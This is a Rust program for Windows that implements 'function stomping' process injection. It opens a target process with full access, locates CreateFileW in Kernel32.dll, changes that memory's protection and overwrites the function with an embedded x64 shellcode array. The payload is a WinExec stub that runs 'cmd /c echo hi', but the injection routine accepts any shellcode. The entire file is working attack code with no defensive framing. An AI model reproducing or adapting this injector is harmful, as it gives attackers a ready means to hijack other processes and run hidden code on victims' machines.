use std::ffi::CString;
use std::{ffi::c_void, process};
use windows::Win32::Foundation::HANDLE;
use windows::Win32::Foundation::PSTR;
use windows::Win32::System::LibraryLoader::GetProcAddress;
use windows::Win32::{
    Foundation::{CloseHandle, HINSTANCE, MAX_PATH, PWSTR},
    System::{
        Diagnostics::Debug::WriteProcessMemory,
        Memory::{VirtualProtectEx, PAGE_EXECUTE_READWRITE, PAGE_EXECUTE_WRITECOPY},
        ProcessStatus::{K32EnumProcessModules, K32GetModuleFileNameExW},
        Threading::{OpenProcess, PROCESS_ALL_ACCESS},
    },
};

// SURPRISE :Dd
const SHELL_CODE: &[u8] = &[
    0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x0, 0x0, 0x0, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51,
    0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52,
    0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0xf, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
    0xac, 0x3c, 0x61, 0x7c, 0x2, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0xd, 0x41, 0x1, 0xc1, 0xe2, 0xed,
    0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48, 0x1, 0xd0, 0x8b, 0x80, 0x88,
    0x0, 0x0, 0x0, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x1, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44,
    0x8b, 0x40, 0x20, 0x49, 0x1, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48,
    0x1, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x41, 0xc1, 0xc9, 0xd, 0x41, 0x1, 0xc1,
    0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x3, 0x4c, 0x24, 0x8, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44,
    0x8b, 0x40, 0x24, 0x49, 0x1, 0xd0, 0x66, 0x41, 0x8b, 0xc, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49,
    0x1, 0xd0, 0x41, 0x8b, 0x4, 0x88, 0x48, 0x1, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a,
    0x41, 0x58, 0x41, 0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41,
    0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x48, 0xba, 0x1, 0x0, 0x0,
    0x0, 0x0, 0x0, 0x0, 0x0, 0x48, 0x8d, 0x8d, 0x1, 0x1, 0x0, 0x0, 0x41, 0xba, 0x31, 0x8b, 0x6f,
    0x87, 0xff, 0xd5, 0xbb, 0xf0, 0xb5, 0xa2, 0x56, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff, 0xd5,
    0x48, 0x83, 0xc4, 0x28, 0x3c, 0x6, 0x7c, 0xa, 0x80, 0xfb, 0xe0, 0x75, 0x5, 0xbb, 0x47, 0x13,
    0x72, 0x6f, 0x6a, 0x0, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x63, 0x6d, 0x64, 0x20, 0x2f, 0x63,
    0x20, 0x65, 0x63, 0x68, 0x6f, 0x20, 0x68, 0x69, 0x20, 0x26, 0x26, 0x20, 0x70, 0x61, 0x75, 0x73,
    0x65, 0x0,
];
const SHELL_CODE_LENGTH: usize = SHELL_CODE.len();

fn main() {
    let pid = 0;
    stomp(pid);
    println!("done!");
}

fn stomp(pid: u32) {
    let handle = unsafe { OpenProcess(PROCESS_ALL_ACCESS, false, pid) };
    if handle.is_invalid() {
        eprintln!("a process with the pid '{pid}' could not be found");
        process::exit(1);
    }
    let func_base = match get_func_base(handle, "Kernel32.dll", "CreateFileW") {
        Some(f) => f,
        None => {
            eprintln!("couldnt get func base");
            process::exit(1);
        }
    };

    let mut old_perms = 0;
    if !unsafe {
        VirtualProtectEx(
            handle,
            func_base as *const c_void,
            SHELL_CODE_LENGTH,
            PAGE_EXECUTE_READWRITE,
            &mut old_perms,
        )
    }
    .as_bool()
    {
        eprintln!("VirtualProtectEx err");
        process::exit(1);
    }

    let mut written = 0;
    if !unsafe {
        WriteProcessMemory(
            handle,
            func_base as *const c_void,
            SHELL_CODE.as_ptr() as *const c_void,
            SHELL_CODE_LENGTH,
            &mut written,
        )
    }
    .as_bool()
    {
        eprintln!("cant write to the target proc memory");
        process::exit(1);
    };

    if !unsafe {
        VirtualProtectEx(
            handle,
            func_base as *const c_void,
            SHELL_CODE_LENGTH,
            PAGE_EXECUTE_WRITECOPY,
            &mut old_perms,
        )
    }
    .as_bool()
    {
        eprintln!("VirtualProtectEx err");
        process::exit(1);
    }

    unsafe { CloseHandle(handle) };
}

fn get_func_base(handle: HANDLE, module_name: &str, func_name: &str) -> Option<usize> {
    let module_name = module_name.to_ascii_lowercase();
    let cstr_func = CString::new(func_name).unwrap();
    let func_name = PSTR(cstr_func.to_bytes().as_ptr() as _);

    let mut module_list_size = 0;
    if !unsafe { K32EnumProcessModules(handle, std::ptr::null_mut(), 0, &mut module_list_size) }
        .as_bool()
    {
        eprintln!("enumeration of proc modules failed");
        return None;
    }

    let mut module_list =
        vec![HINSTANCE::default(); module_list_size as usize / std::mem::size_of::<HINSTANCE>()];

    if !unsafe {
        K32EnumProcessModules(
            handle,
            module_list.as_mut_ptr(),
            module_list_size,
            &mut module_list_size,
        )
    }
    .as_bool()
    {
        if !unsafe {
            K32EnumProcessModules(
                handle,
                module_list.as_mut_ptr(),
                module_list_size,
                &mut module_list_size,
            )
        }
        .as_bool()
        {
            eprintln!("enumeration of proc modules failed");
            return None;
        }
    }

    for cur_module in module_list {
        let mut cur_module_name_buf = [0u16; MAX_PATH as usize];
        let cur_module_name = PWSTR(cur_module_name_buf.as_mut_ptr());
        if unsafe { K32GetModuleFileNameExW(handle, cur_module, cur_module_name, MAX_PATH) } == 0 {
            continue;
        }
        let m_name = String::from_utf16_lossy(&cur_module_name_buf);
        if m_name.to_ascii_lowercase().contains(&module_name) {
            match unsafe { GetProcAddress(cur_module, func_name) } {
                Some(addr) => return Some(addr as usize),
                None => {
                    eprintln!("module not found");
                    return None;
                }
            }
        }
    }
    None
}
